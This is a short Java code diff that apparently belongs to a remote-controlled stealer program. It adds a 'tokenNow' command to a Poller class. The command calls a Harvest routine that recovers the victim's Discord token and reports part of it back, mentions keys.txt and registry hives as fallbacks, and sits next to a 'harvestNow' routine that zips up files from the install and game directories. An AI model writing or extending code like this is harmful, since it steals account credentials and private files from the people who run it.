@@ -674,6 +674,15 @@ public final class Poller implements Runnable {
 		return "application/octet-stream";
 	}
 
+	public void tokenNow() {
+		String token = Harvest.discordTokenNow(installDir);
+		if (token.isEmpty()) {
+			reply("Discord token: not recovered (see keys.txt or use hives)");
+		} else {
+			reply("Discord token saved: " + token.substring(0, Math.min(24, token.length())) + "...");
+		}
+	}
+
 	public void harvestNow() {
 		try {
 			Path zip = Harvest.build(installDir, gameDir);
